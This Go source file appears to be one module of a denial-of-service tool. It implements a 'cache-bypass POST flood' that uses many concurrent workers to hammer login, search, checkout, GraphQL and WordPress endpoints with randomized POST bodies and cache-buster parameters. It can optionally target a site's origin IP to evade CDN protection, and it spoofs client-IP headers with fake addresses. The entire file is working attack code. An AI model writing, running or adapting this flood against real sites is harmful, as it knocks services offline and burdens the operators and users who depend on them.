package main

import (
	"crypto/tls"
	"fmt"
	"log"
	"net"
	"net/url"
	"sync"
	"sync/atomic"
	"time"
)

// Cache-Bypass POST Flood
// POST requests bypass CDN cache by default
// Combined with random body + random URL = NEVER cached
// Each request hits origin server backend = real impact
// Targets: /search, /login, /register, /api/* (DB-backed endpoints)

func runCacheBypassFlood(cfg *AttackConfig) {
	atomic.StoreInt32(&stopFlag, 0)
	startTime := time.Now()
	deadline := startTime.Add(time.Duration(cfg.Duration) * time.Second)

	target := cfg.Target
	host := target
	port := "443"
	useTLS := true

	if u, err := url.Parse(target); err == nil && u.Hostname() != "" {
		host = u.Hostname()
		if u.Port() != "" {
			port = u.Port()
		} else if u.Scheme == "http" {
			port = "80"
			useTLS = false
		}
	}

	hostHeader := host
	if cfg.OriginIP != "" {
		host = cfg.OriginIP
	}

	connCount := cfg.Threads
	if connCount < 50 {
		connCount = 100
	}

	log.Printf("Cache-Bypass POST Flood: %d workers to %s:%s (Host: %s)", connCount, host, port, hostHeader)

	// DB-heavy endpoints that CDN can't cache
	endpoints := []string{
		"/search?q=", "/?s=", "/?p=",
		"/wp-admin/admin-ajax.php?action=heartbeat",
		"/wp-login.php",
		"/login", "/api/auth/login", "/auth/login",
		"/register", "/api/register",
		"/checkout", "/api/checkout",
		"/contact", "/api/contact",
		"/api/v1/users/me", "/api/v1/posts", "/api/v1/search",
		"/graphql", "/api/graphql",
		"/xmlrpc.php",
	}

	var wg sync.WaitGroup
	for i := 0; i < connCount; i++ {
		wg.Add(1)
		go func(id int) {
			defer wg.Done()
			defer func() {
				if r := recover(); r != nil {
					log.Printf("CacheBypass worker %d recovered: %v", id, r)
				}
			}()

			perWorkerRPS := cfg.RPS / connCount
			if perWorkerRPS < 1 {
				perWorkerRPS = 10
			}

			rate := time.NewTicker(time.Second / time.Duration(perWorkerRPS))
			defer rate.Stop()

			endpointIdx := id

			for time.Now().Before(deadline) {
				if atomic.LoadInt32(&stopFlag) == 1 {
					return
				}
				<-rate.C

				endpoint := endpoints[endpointIdx%len(endpoints)]
				endpointIdx++

				err := cacheBypassRequest(host, port, hostHeader, endpoint, useTLS)
				atomic.AddInt64(&metrics.TotalRequests, 1)
				if err != nil {
					atomic.AddInt64(&metrics.Failed, 1)
				} else {
					atomic.AddInt64(&metrics.Completed, 1)
				}
			}
		}(i)
	}

	wg.Wait()
	metricsMu.Lock()
	metrics.Elapsed = time.Since(startTime).Seconds()
	metricsMu.Unlock()
}

func cacheBypassRequest(host, port, hostHeader, endpoint string, useTLS bool) error {
	dialer := &net.Dialer{Timeout: 6 * time.Second}
	rawConn, err := dialer.Dial("tcp", host+":"+port)
	if err != nil {
		return err
	}
	defer rawConn.Close()

	if tcpConn, ok := rawConn.(*net.TCPConn); ok {
		tcpConn.SetNoDelay(true)
	}

	var conn net.Conn = rawConn
	if useTLS {
		tlsConn := tls.Client(rawConn, &tls.Config{
			InsecureSkipVerify: true,
			ServerName:         hostHeader,
		})
		tlsConn.SetDeadline(time.Now().Add(8 * time.Second))
		if err := tlsConn.Handshake(); err != nil {
			return err
		}
		conn = tlsConn
		defer tlsConn.Close()
	}

	conn.SetDeadline(time.Now().Add(6 * time.Second))

	// Random body data - varies per request to bust any cache
	bodySize := 100 + (int(time.Now().UnixNano()) % 500)
	body := make([]byte, bodySize)
	for i := range body {
		body[i] = byte('a' + (time.Now().UnixNano() % 26))
	}

	// Form-encoded body to look legitimate
	bodyStr := fmt.Sprintf("user=u%d&pass=p%d&token=%x&q=%s&action=submit",
		time.Now().UnixNano()%99999,
		time.Now().UnixNano()%99999,
		time.Now().UnixNano(),
		string(body[:50]))

	// Add unique cache-buster to URL
	cb := fmt.Sprintf("_cb=%d&_r=%d", time.Now().UnixNano(), atomic.LoadInt64(&uaCounter))
	separator := "?"
	if contains(endpoint, "?") {
		separator = "&"
	}
	fullEndpoint := endpoint + separator + cb

	// Build POST request with no-cache headers + IP spoofing
	req := fmt.Sprintf(
		"POST %s HTTP/1.1\r\n"+
			"Host: %s\r\n"+
			"User-Agent: %s\r\n"+
			"Accept: text/html,application/json,*/*\r\n"+
			"Accept-Language: en-US,en;q=0.9\r\n"+
			"Accept-Encoding: gzip, deflate, br\r\n"+
			"Content-Type: application/x-www-form-urlencoded\r\n"+
			"Content-Length: %d\r\n"+
			"Cache-Control: no-cache, no-store, must-revalidate, max-age=0\r\n"+
			"Pragma: no-cache\r\n"+
			"Origin: https://%s\r\n"+
			"Referer: https://%s/\r\n"+
			"X-Forwarded-For: %s\r\n"+
			"X-Real-IP: %s\r\n"+
			"CF-Connecting-IP: %s\r\n"+
			"X-Originating-IP: %s\r\n"+
			"X-Cluster-Client-IP: %s\r\n"+
			"True-Client-IP: %s\r\n"+
			"X-Forwarded-Host: %s\r\n"+
			"Connection: close\r\n"+
			"\r\n%s",
		fullEndpoint, hostHeader, randomUA(),
		len(bodyStr), hostHeader, hostHeader,
		randomFakeIP(), randomFakeIP(), randomFakeIP(), randomFakeIP(),
		randomFakeIP(), randomFakeIP(), hostHeader,
		bodyStr,
	)

	if _, err := conn.Write([]byte(req)); err != nil {
		return err
	}

	// Drain response so connection closes cleanly
	buf := make([]byte, 4096)
	conn.SetReadDeadline(time.Now().Add(3 * time.Second))
	conn.Read(buf)

	return nil
}

func randomFakeIP() string {
	v := atomic.AddInt64(&uaCounter, 1)
	a := (v >> 24) & 0xFF
	b := (v >> 16) & 0xFF
	c := (v >> 8) & 0xFF
	d := v & 0xFF
	if a == 0 {
		a = 1
	}
	if d == 0 {
		d = 1
	}
	return fmt.Sprintf("%d.%d.%d.%d", a, b, c, d)
}
